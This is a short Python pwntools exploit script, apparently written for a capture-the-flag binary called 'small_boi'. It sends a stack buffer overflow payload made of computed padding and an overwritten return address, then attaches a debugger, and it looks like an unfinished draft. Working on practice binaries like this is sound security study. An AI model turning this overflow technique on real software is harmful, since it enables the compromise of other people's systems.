#coding=utf-8
from pwn import *

p = process('./small_boi')
stack = 0x7fffffffe478
ret = 0x7fffffffe4a0
p.sendline('a' * (ret - stack) + p32(0x400180) + 'B' * 200)
gdb.attach(p)
